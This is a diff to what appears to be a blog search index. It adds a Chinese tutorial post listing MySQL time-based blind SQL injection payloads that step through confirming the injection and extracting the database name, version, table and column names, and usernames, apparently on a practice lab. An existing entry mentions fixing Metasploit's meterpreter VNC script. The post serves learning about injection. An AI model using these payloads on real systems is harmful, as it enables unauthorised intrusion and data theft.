@@ -1,6 +1,18 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title><![CDATA[Mysql延时盲注payload]]></title>
+    <url>%2F2017%2F09%2F16%2FsleepBlandSQLInjection%2F</url>
+    <content type="text"><![CDATA[如题 Mysql延时盲注payloadpayload123456789101112131415161718一、得到正确的注入方式?id=1&apos; and sleep(5) --+ 进行注入尝试，如果页面休眠5秒后返回，则证明该注入方式是可以使用的，sql语句已生效?username=admin&apos; and if(1=2,1,sleep(10))#二、判断数据库名?id=1&apos; and if((select length(database())&gt;7)&gt;0,sleep(5),null) --+ 判断数据库长度是否大于7?id=1&apos; and if((select ascii(substr(database(),1,1))&gt;97)&gt;0,sleep(5),null) --+ 判断数据库名的第一个字符ascii是否大于97?id=1&apos; and if((select database())=&quot;security&quot;,sleep(5),null) --+ 判断数据库名是否为security，如果是则休眠5秒，否则立即返回三、判断版本号?id=1&apos; and if((select version()) like &quot;10%&quot;,sleep(5),null) --+ 判断版本号是否为10开头的（一般用5），如果是则休眠5秒四、判断表名?id=1&apos; and if ((select length(table_name)&gt;4 from information_schema.tables limit 2,1)&gt;0,sleep(5),null); --+ 判断第三个表的表名长度是否大于4?id=1&apos; and if ((select substr(table_name,1,1) from information_schema.tables limit 2,1)=&apos;u&apos;,sleep(5),null); --+ 判断第三个表的表名的第一个字母是否为u五、判断列名?id=1&apos; and if ((select length(column_name)&gt;1 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(5),null); --+ 判断users表的第一列名的长度是否大于1?id=1&apos; and if((select ascii(substr(column_name,1,1))&gt;97 from information_schema.columns where table_schema=database() and table_name=&quot;users&quot; limit 0,1)&gt;0,sleep(3),null)--+ 判断users表的第一列名的第一个字符ascii是否大于97六、得到数据?id=1&apos; and if((select length(username)&gt;1 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username列的第一条数据的长度是否大于1?id=1&apos; and if((select ascii(substr(username,1,1))&gt;65 from users limit 0,1)&gt;0,sleep(3),null)--+ 判断username的第一条数据的第一个字符的ascii是否大于65]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL注入</tag>
+        <tag>延时盲注</tag>
+      </tags>
+  </entry>
+  <entry>
     <title><![CDATA[run vnc遇到的问题解决]]></title>
     <url>%2F2017%2F09%2F16%2FsolveRunVnc%2F</url>
     <content type="text"><![CDATA[解决run vnc无法进行控制的问题，以及-c参数无法打开 run vnc无法控制屏幕解决：打开/usr/share/metasploit-framework/scripts/meterpreter/vnc.rb添加：然后问题就解决了 -c参数无法打开courtesy shell：]]></content>
